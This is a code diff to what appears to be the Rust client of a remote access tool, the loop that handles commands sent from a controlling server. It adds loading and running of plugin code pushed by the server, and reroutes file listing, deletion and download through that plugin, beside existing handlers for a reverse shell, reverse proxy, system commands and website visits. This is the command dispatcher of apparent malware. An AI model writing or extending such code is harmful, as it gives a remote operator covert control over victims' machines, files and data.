@@ -15,9 +15,16 @@ use crate::features::reverse_proxy::ReverseProxy;
 use common::connection::{ConnectionReader, ConnectionWriter};
 use crate::service::config::get_config;
 use crate::REVERSE_SHELL;
+use std::collections::HashMap;
+use std::sync::Arc;
+use crate::plugin_manager::plugin::Plugin;
 
 static PACKET_SENDER: Lazy<Mutex<Option<mpsc::Sender<ServerboundPacket>>>> = Lazy::new(|| {
     Mutex::new(None)
+});
+
+pub static RUNNING_PLUGINS: Lazy<Mutex<HashMap<String, Arc<Plugin>>>> = Lazy::new(|| {
+    Mutex::new(HashMap::new())
 });
 
 pub async fn reading_loop(
@@ -44,6 +51,19 @@ pub async fn reading_loop(
                             Ok(_) => println!("Sent client info to server on retry"),
                             Err(e) => println!("Failed to send client info on retry: {}", e),
                         }
+                    }
+                }
+            }
+
+            Ok(Some(ClientboundPacket::ExecutePlugin(plugin_name, plugin_data))) => {
+                match Plugin::new(plugin_name.clone(), plugin_data) {
+                    Ok(plugin) => {
+                        let mut map = RUNNING_PLUGINS.lock().unwrap();
+                        map.insert(plugin_name.clone(), plugin);
+                        println!("✅ Plugin '{}' loaded successfully!", plugin_name);
+                    }
+                    Err(e) => {
+                        println!("❌ Failed to load plugin '{}': {:?}", plugin_name, e);
                     }
                 }
             }
@@ -81,17 +101,59 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::ManageSystem(command))) => system_commands(&command),
 
-            Ok(Some(ClientboundPacket::AvailableDisks)) => file_manager.list_available_disks().await,
-
-            Ok(Some(ClientboundPacket::PreviousDir)) => file_manager.navigate_to_parent().await,
-
-            Ok(Some(ClientboundPacket::ViewDir(path))) => file_manager.view_folder(&path).await,
-
-            Ok(Some(ClientboundPacket::RemoveDir(path))) => file_manager.remove_directory(&path).await,
-
-            Ok(Some(ClientboundPacket::RemoveFile(path))) => file_manager.remove_file(&path).await,
-
-            Ok(Some(ClientboundPacket::DownloadFile(path))) => file_manager.download_file(&path).await,
+            Ok(Some(ClientboundPacket::AvailableDisks)) => {
+                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
+                    plugin.execute(b"list_available_disks".to_vec());
+                } else {
+                    println!("⚠️ Plugin 'file_manager' not found!");
+                }
+            }
+            
+            Ok(Some(ClientboundPacket::PreviousDir)) => {
+                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
+                    plugin.execute(b"previous_dir".to_vec());
+                    plugin.execute(b"write_current_folder".to_vec());
+                } else {
+                    println!("⚠️ Plugin 'file_manager' not found!");
+                }
+            }
+            
+            Ok(Some(ClientboundPacket::ViewDir(path))) => {
+                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
+                    let cmd = format!("view_folder:{}", path);
+                    plugin.execute(cmd.into_bytes());
+                    plugin.execute(b"write_current_folder".to_vec());
+                } else {
+                    println!("⚠️ Plugin 'file_manager' not found!");
+                }
+            }
+            
+            Ok(Some(ClientboundPacket::RemoveDir(path))) => {
+                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
+                    let cmd = format!("remove_dir:{}", path);
+                    plugin.execute(cmd.into_bytes());
+                } else {
+                    println!("⚠️ Plugin 'file_manager' not found!");
+                }
+            }
+            
+            Ok(Some(ClientboundPacket::RemoveFile(path))) => {
+                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
+                    let cmd = format!("remove_file:{}", path);
+                    plugin.execute(cmd.into_bytes());
+                } else {
+                    println!("⚠️ Plugin 'file_manager' not found!");
+                }
+            }
+            
+            Ok(Some(ClientboundPacket::DownloadFile(path))) => {
+                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
+                    let cmd = format!("download_file:{}", path);
+                    plugin.execute(cmd.into_bytes());
+                } else {
+                    println!("⚠️ Plugin 'file_manager' not found!");
+                }
+            }
             
             Ok(Some(ClientboundPacket::VisitWebsite(visit_data))) => visit_website(&visit_data),
 
